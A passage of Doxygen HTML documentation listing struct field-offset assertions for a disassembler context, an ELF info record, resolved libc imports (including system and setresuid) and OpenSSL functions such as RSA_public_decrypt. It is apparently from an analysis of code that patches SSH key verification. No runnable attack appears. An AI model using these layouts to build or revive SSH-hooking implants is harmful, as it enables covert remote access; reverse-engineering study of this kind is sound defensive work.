<tr class="separator:aa2e50f205f98d5f025f5eb9ba07d039b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1cd2ff2b6482f5374b4fe62381763967"><td class="memItemLeft" align="right" valign="top"><a id="a1cd2ff2b6482f5374b4fe62381763967"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, operand_size, 0x48)</td></tr>
<tr class="separator:a1cd2ff2b6482f5374b4fe62381763967"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:abb3f2de7b7e5754295e89cbf02531246"><td class="memItemLeft" align="right" valign="top"><a id="abb3f2de7b7e5754295e89cbf02531246"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, insn_offset, 0x50)</td></tr>
<tr class="separator:abb3f2de7b7e5754295e89cbf02531246"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5416f420fcca6102d1bd2f242c6af3bc"><td class="memItemLeft" align="right" valign="top"><a id="a5416f420fcca6102d1bd2f242c6af3bc"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, elfbase, 0x0)</td></tr>
<tr class="separator:a5416f420fcca6102d1bd2f242c6af3bc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab61bf638327c66988e78d20f8c93aa2a"><td class="memItemLeft" align="right" valign="top"><a id="ab61bf638327c66988e78d20f8c93aa2a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, first_vaddr, 0x8)</td></tr>
<tr class="separator:ab61bf638327c66988e78d20f8c93aa2a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4421b8b37fd7c599f6be0c195a56d792"><td class="memItemLeft" align="right" valign="top"><a id="a4421b8b37fd7c599f6be0c195a56d792"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, phdrs, 0x10)</td></tr>
<tr class="separator:a4421b8b37fd7c599f6be0c195a56d792"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2e34f0eff9b6da18356194d477baaf91"><td class="memItemLeft" align="right" valign="top"><a id="a2e34f0eff9b6da18356194d477baaf91"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, e_phnum, 0x18)</td></tr>
<tr class="separator:a2e34f0eff9b6da18356194d477baaf91"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a64f4220b000ba672c282eb0a305df6e5"><td class="memItemLeft" align="right" valign="top"><a id="a64f4220b000ba672c282eb0a305df6e5"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, dyn, 0x20)</td></tr>
<tr class="separator:a64f4220b000ba672c282eb0a305df6e5"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac2f6b3ca1019cccb9253cb29f4b3e5c1"><td class="memItemLeft" align="right" valign="top"><a id="ac2f6b3ca1019cccb9253cb29f4b3e5c1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, dyn_num_entries, 0x28)</td></tr>
<tr class="separator:ac2f6b3ca1019cccb9253cb29f4b3e5c1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af538d756521ed0fc4a0f91ca0f6602d5"><td class="memItemLeft" align="right" valign="top"><a id="af538d756521ed0fc4a0f91ca0f6602d5"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, strtab, 0x30)</td></tr>
<tr class="separator:af538d756521ed0fc4a0f91ca0f6602d5"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6468e4e51c4a23ba1324a87265abbde6"><td class="memItemLeft" align="right" valign="top"><a id="a6468e4e51c4a23ba1324a87265abbde6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, symtab, 0x38)</td></tr>
<tr class="separator:a6468e4e51c4a23ba1324a87265abbde6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac0a81e057eb2ac23075ac7e4b87f3d08"><td class="memItemLeft" align="right" valign="top"><a id="ac0a81e057eb2ac23075ac7e4b87f3d08"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, plt_relocs, 0x40)</td></tr>
<tr class="separator:ac0a81e057eb2ac23075ac7e4b87f3d08"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0c7d54c9d562655bef4411005c91ce5d"><td class="memItemLeft" align="right" valign="top"><a id="a0c7d54c9d562655bef4411005c91ce5d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, plt_relocs_num, 0x48)</td></tr>
<tr class="separator:a0c7d54c9d562655bef4411005c91ce5d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2649eefdb981092a4966acff10794356"><td class="memItemLeft" align="right" valign="top"><a id="a2649eefdb981092a4966acff10794356"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnurelro_found, 0x4C)</td></tr>
<tr class="separator:a2649eefdb981092a4966acff10794356"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a657018488217b8f085e4ad037df4428b"><td class="memItemLeft" align="right" valign="top"><a id="a657018488217b8f085e4ad037df4428b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnurelro_vaddr, 0x50)</td></tr>
<tr class="separator:a657018488217b8f085e4ad037df4428b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a75da95cf5fb8a74215d3071e7c7e2147"><td class="memItemLeft" align="right" valign="top"><a id="a75da95cf5fb8a74215d3071e7c7e2147"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnurelro_memsize, 0x58)</td></tr>
<tr class="separator:a75da95cf5fb8a74215d3071e7c7e2147"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ada2bbbbb7ab077575dd68942d8b2326b"><td class="memItemLeft" align="right" valign="top"><a id="ada2bbbbb7ab077575dd68942d8b2326b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, verdef, 0x60)</td></tr>
<tr class="separator:ada2bbbbb7ab077575dd68942d8b2326b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5ab7213d4e836b9835119a782d04aca0"><td class="memItemLeft" align="right" valign="top"><a id="a5ab7213d4e836b9835119a782d04aca0"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, verdef_num, 0x68)</td></tr>
<tr class="separator:a5ab7213d4e836b9835119a782d04aca0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9d8aa794e4dab4d1187810d207e7e577"><td class="memItemLeft" align="right" valign="top"><a id="a9d8aa794e4dab4d1187810d207e7e577"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, versym, 0x70)</td></tr>
<tr class="separator:a9d8aa794e4dab4d1187810d207e7e577"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad19909828dce0a610b733166946cdbdb"><td class="memItemLeft" align="right" valign="top"><a id="ad19909828dce0a610b733166946cdbdb"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, rela_relocs, 0x78)</td></tr>
<tr class="separator:ad19909828dce0a610b733166946cdbdb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8ff5c8a654bc51cc441e1d9089604933"><td class="memItemLeft" align="right" valign="top"><a id="a8ff5c8a654bc51cc441e1d9089604933"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, rela_relocs_num, 0x80)</td></tr>
<tr class="separator:a8ff5c8a654bc51cc441e1d9089604933"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab1d9bebf57801454f1008a16df5cab08"><td class="memItemLeft" align="right" valign="top"><a id="ab1d9bebf57801454f1008a16df5cab08"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, relr_relocs, 0x88)</td></tr>
<tr class="separator:ab1d9bebf57801454f1008a16df5cab08"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa2c9ae3b66e5bf8e842d53e80ce09e3d"><td class="memItemLeft" align="right" valign="top"><a id="aa2c9ae3b66e5bf8e842d53e80ce09e3d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, relr_relocs_num, 0x90)</td></tr>
<tr class="separator:aa2c9ae3b66e5bf8e842d53e80ce09e3d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9fc38efd72107eade4c9671f6518c36d"><td class="memItemLeft" align="right" valign="top"><a id="a9fc38efd72107eade4c9671f6518c36d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, code_segment_start, 0x98)</td></tr>
<tr class="separator:a9fc38efd72107eade4c9671f6518c36d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:adb0937aa24d26b1d0ff613762ed91b4f"><td class="memItemLeft" align="right" valign="top"><a id="adb0937aa24d26b1d0ff613762ed91b4f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, code_segment_size, 0xA0)</td></tr>
<tr class="separator:adb0937aa24d26b1d0ff613762ed91b4f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3d4321bb64e4f11110524e4e625e4975"><td class="memItemLeft" align="right" valign="top"><a id="a3d4321bb64e4f11110524e4e625e4975"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, rodata_segment_start, 0xA8)</td></tr>
<tr class="separator:a3d4321bb64e4f11110524e4e625e4975"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a67f786326030385e06f0b7cab983cf6d"><td class="memItemLeft" align="right" valign="top"><a id="a67f786326030385e06f0b7cab983cf6d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, rodata_segment_size, 0xB0)</td></tr>
<tr class="separator:a67f786326030385e06f0b7cab983cf6d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a126df62d11b2ea6e222f8bd191007d38"><td class="memItemLeft" align="right" valign="top"><a id="a126df62d11b2ea6e222f8bd191007d38"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, data_segment_start, 0xB8)</td></tr>
<tr class="separator:a126df62d11b2ea6e222f8bd191007d38"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a08cf5f48edba2f5fec97f01f294d56c1"><td class="memItemLeft" align="right" valign="top"><a id="a08cf5f48edba2f5fec97f01f294d56c1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, data_segment_size, 0xC0)</td></tr>
<tr class="separator:a08cf5f48edba2f5fec97f01f294d56c1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6ab1c77449b7ea3654269c010c29a483"><td class="memItemLeft" align="right" valign="top"><a id="a6ab1c77449b7ea3654269c010c29a483"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, data_segment_alignment, 0xC8)</td></tr>
<tr class="separator:a6ab1c77449b7ea3654269c010c29a483"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad454efb2e2e28c7efd261a691d1248a1"><td class="memItemLeft" align="right" valign="top"><a id="ad454efb2e2e28c7efd261a691d1248a1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, flags, 0xD0)</td></tr>
<tr class="separator:ad454efb2e2e28c7efd261a691d1248a1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a040344add144ce988d0be2ae515ddf7b"><td class="memItemLeft" align="right" valign="top"><a id="a040344add144ce988d0be2ae515ddf7b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnu_hash_nbuckets, 0xd8)</td></tr>
<tr class="separator:a040344add144ce988d0be2ae515ddf7b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae30d2c21ea86fb45f43bed0226bfd3a0"><td class="memItemLeft" align="right" valign="top"><a id="ae30d2c21ea86fb45f43bed0226bfd3a0"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnu_hash_last_bloom, 0xdc)</td></tr>
<tr class="separator:ae30d2c21ea86fb45f43bed0226bfd3a0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8d95d2a44dc4ce9586cbfdf0ee27a103"><td class="memItemLeft" align="right" valign="top"><a id="a8d95d2a44dc4ce9586cbfdf0ee27a103"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnu_hash_bloom_shift, 0xe0)</td></tr>
<tr class="separator:a8d95d2a44dc4ce9586cbfdf0ee27a103"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6b6b4eeccbfa4914e8ea44d25257a925"><td class="memItemLeft" align="right" valign="top"><a id="a6b6b4eeccbfa4914e8ea44d25257a925"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnu_hash_bloom, 0xe8)</td></tr>
<tr class="separator:a6b6b4eeccbfa4914e8ea44d25257a925"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a50cc50a23e084b091c63a9fb46e2b580"><td class="memItemLeft" align="right" valign="top"><a id="a50cc50a23e084b091c63a9fb46e2b580"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnu_hash_buckets, 0xf0)</td></tr>
<tr class="separator:a50cc50a23e084b091c63a9fb46e2b580"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aad70f3e20103f9ba5f86dd4797fee165"><td class="memItemLeft" align="right" valign="top"><a id="aad70f3e20103f9ba5f86dd4797fee165"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnu_hash_chain, 0xf8)</td></tr>
<tr class="separator:aad70f3e20103f9ba5f86dd4797fee165"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a00860c16277f603a88e90ee7bdb4dcbb"><td class="memItemLeft" align="right" valign="top"><a id="a00860c16277f603a88e90ee7bdb4dcbb"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, resolved_imports_count, 0)</td></tr>
<tr class="separator:a00860c16277f603a88e90ee7bdb4dcbb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a34bd5c6bf55d8e7275d0c0985b2e5573"><td class="memItemLeft" align="right" valign="top"><a id="a34bd5c6bf55d8e7275d0c0985b2e5573"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, malloc_usable_size, 8)</td></tr>
<tr class="separator:a34bd5c6bf55d8e7275d0c0985b2e5573"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a71d6db47afe1c90489009655cab2fe50"><td class="memItemLeft" align="right" valign="top"><a id="a71d6db47afe1c90489009655cab2fe50"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, getuid, 0x10)</td></tr>
<tr class="separator:a71d6db47afe1c90489009655cab2fe50"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aadb7b4f780e25591e202345fe5ce778c"><td class="memItemLeft" align="right" valign="top"><a id="aadb7b4f780e25591e202345fe5ce778c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, exit, 0x18)</td></tr>
<tr class="separator:aadb7b4f780e25591e202345fe5ce778c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af14b1d92dcf9e13f15019a5794d50f95"><td class="memItemLeft" align="right" valign="top"><a id="af14b1d92dcf9e13f15019a5794d50f95"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, setresgid, 0x20)</td></tr>
<tr class="separator:af14b1d92dcf9e13f15019a5794d50f95"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a690308f78d17f696eadab775d1748e9c"><td class="memItemLeft" align="right" valign="top"><a id="a690308f78d17f696eadab775d1748e9c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, setresuid, 0x28)</td></tr>
<tr class="separator:a690308f78d17f696eadab775d1748e9c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a08578979bc50e6fc12121a85a1b55ba4"><td class="memItemLeft" align="right" valign="top"><a id="a08578979bc50e6fc12121a85a1b55ba4"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, system, 0x30)</td></tr>
<tr class="separator:a08578979bc50e6fc12121a85a1b55ba4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa32ec892ff21e9a696d1c844617d148e"><td class="memItemLeft" align="right" valign="top"><a id="aa32ec892ff21e9a696d1c844617d148e"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, write, 0x38)</td></tr>
<tr class="separator:aa32ec892ff21e9a696d1c844617d148e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a94c39588627205dda1307dfd7eb91943"><td class="memItemLeft" align="right" valign="top"><a id="a94c39588627205dda1307dfd7eb91943"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, pselect, 0x40)</td></tr>
<tr class="separator:a94c39588627205dda1307dfd7eb91943"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a375d718f3973cd7c34e9f8d85230640a"><td class="memItemLeft" align="right" valign="top"><a id="a375d718f3973cd7c34e9f8d85230640a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, read, 0x48)</td></tr>
<tr class="separator:a375d718f3973cd7c34e9f8d85230640a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab9b20107be7daf5be86fa76b96e891b5"><td class="memItemLeft" align="right" valign="top"><a id="ab9b20107be7daf5be86fa76b96e891b5"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, __errno_location, 0x50)</td></tr>
<tr class="separator:ab9b20107be7daf5be86fa76b96e891b5"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab72ad74e5b5db370d8f763c5d27a54c9"><td class="memItemLeft" align="right" valign="top"><a id="ab72ad74e5b5db370d8f763c5d27a54c9"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, setlogmask, 0x58)</td></tr>
<tr class="separator:ab72ad74e5b5db370d8f763c5d27a54c9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5851616bcf3585a4d63255e27d4b9080"><td class="memItemLeft" align="right" valign="top"><a id="a5851616bcf3585a4d63255e27d4b9080"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, shutdown, 0x60)</td></tr>
<tr class="separator:a5851616bcf3585a4d63255e27d4b9080"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a525e387ac28e1d2974ba5eda4c2e24d4"><td class="memItemLeft" align="right" valign="top"><a id="a525e387ac28e1d2974ba5eda4c2e24d4"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, __libc_stack_end, 0x68)</td></tr>
<tr class="separator:a525e387ac28e1d2974ba5eda4c2e24d4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac4c84e3eaafa66db192ff467575c07ef"><td class="memItemLeft" align="right" valign="top"><a id="ac4c84e3eaafa66db192ff467575c07ef"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, <a class="el" href="ssh__patch_8c.html#ae142ad01d213393458d1f4770b68555f">RSA_public_decrypt</a>, 0)</td></tr>
<tr class="separator:ac4c84e3eaafa66db192ff467575c07ef"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a06fbb87ece293673ae049e3d17a927fc"><td class="memItemLeft" align="right" valign="top"><a id="a06fbb87ece293673ae049e3d17a927fc"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_PKEY_set1_RSA, 8)</td></tr>
<tr class="separator:a06fbb87ece293673ae049e3d17a927fc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a686404ffefa47e862382092121bfc0b8"><td class="memItemLeft" align="right" valign="top"><a id="a686404ffefa47e862382092121bfc0b8"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, RSA_get0_key_null, 0x10)</td></tr>
<tr class="separator:a686404ffefa47e862382092121bfc0b8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5d2cf0588ff092c0c868f77fe6b0c891"><td class="memItemLeft" align="right" valign="top"><a id="a5d2cf0588ff092c0c868f77fe6b0c891"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, RSA_public_decrypt_plt, 0x18)</td></tr>
<tr class="separator:a5d2cf0588ff092c0c868f77fe6b0c891"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a80afe68eeb6661768178ee09af63b655"><td class="memItemLeft" align="right" valign="top"><a id="a80afe68eeb6661768178ee09af63b655"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_PKEY_set1_RSA_plt, 0x20)</td></tr>
<tr class="separator:a80afe68eeb6661768178ee09af63b655"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab3393e7d1ec13dddc8167bfc6c986aee"><td class="memItemLeft" align="right" valign="top"><a id="ab3393e7d1ec13dddc8167bfc6c986aee"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, RSA_get0_key_plt, 0x28)</td></tr>
<tr class="separator:ab3393e7d1ec13dddc8167bfc6c986aee"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4204d0c32a5ccc55ab1a298d689bd4fb"><td class="memItemLeft" align="right" valign="top"><a id="a4204d0c32a5ccc55ab1a298d689bd4fb"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, DSA_get0_pqg, 0x30)</td></tr>
<tr class="separator:a4204d0c32a5ccc55ab1a298d689bd4fb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a18134fb834fe77fbdaf346f5a6ee7549"><td class="memItemLeft" align="right" valign="top"><a id="a18134fb834fe77fbdaf346f5a6ee7549"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, DSA_get0_pub_key, 0x38)</td></tr>
<tr class="separator:a18134fb834fe77fbdaf346f5a6ee7549"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afdd75328fa4e18f7af8e5dc822202c2b"><td class="memItemLeft" align="right" valign="top"><a id="afdd75328fa4e18f7af8e5dc822202c2b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EC_POINT_point2oct, 0x40)</td></tr>
<tr class="separator:afdd75328fa4e18f7af8e5dc822202c2b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae4d189f2eb6f3a41e228a04ac75d3aae"><td class="memItemLeft" align="right" valign="top"><a id="ae4d189f2eb6f3a41e228a04ac75d3aae"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EC_KEY_get0_public_key, 0x48)</td></tr>
<tr class="separator:ae4d189f2eb6f3a41e228a04ac75d3aae"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acd622db624e55e081943d52838837d1f"><td class="memItemLeft" align="right" valign="top"><a id="acd622db624e55e081943d52838837d1f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EC_KEY_get0_group, 0x50)</td></tr>
<tr class="separator:acd622db624e55e081943d52838837d1f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad7615b76f76544beead47d64ef914859"><td class="memItemLeft" align="right" valign="top"><a id="ad7615b76f76544beead47d64ef914859"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_sha256, 0x58)</td></tr>
<tr class="separator:ad7615b76f76544beead47d64ef914859"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aaace0e1ca20316181905ff732b2eb0fb"><td class="memItemLeft" align="right" valign="top"><a id="aaace0e1ca20316181905ff732b2eb0fb"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, RSA_get0_key, 0x60)</td></tr>
<tr class="separator:aaace0e1ca20316181905ff732b2eb0fb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a306bfc6358dc48cff25f872096df386b"><td class="memItemLeft" align="right" valign="top"><a id="a306bfc6358dc48cff25f872096df386b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, BN_num_bits, 0x68)</td></tr>
<tr class="separator:a306bfc6358dc48cff25f872096df386b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aaf26f8ccf05b46f22b7fc7aa077905a9"><td class="memItemLeft" align="right" valign="top"><a id="aaf26f8ccf05b46f22b7fc7aa077905a9"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_PKEY_new_raw_public_key, 0x70)</td></tr>
<tr class="separator:aaf26f8ccf05b46f22b7fc7aa077905a9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9ea84ab683be032441e50ffd0bb60e27"><td class="memItemLeft" align="right" valign="top"><a id="a9ea84ab683be032441e50ffd0bb60e27"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_MD_CTX_new, 0x78)</td></tr>
<tr class="separator:a9ea84ab683be032441e50ffd0bb60e27"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae5361f6713ec771fba1da20f1527ee09"><td class="memItemLeft" align="right" valign="top"><a id="ae5361f6713ec771fba1da20f1527ee09"></a>
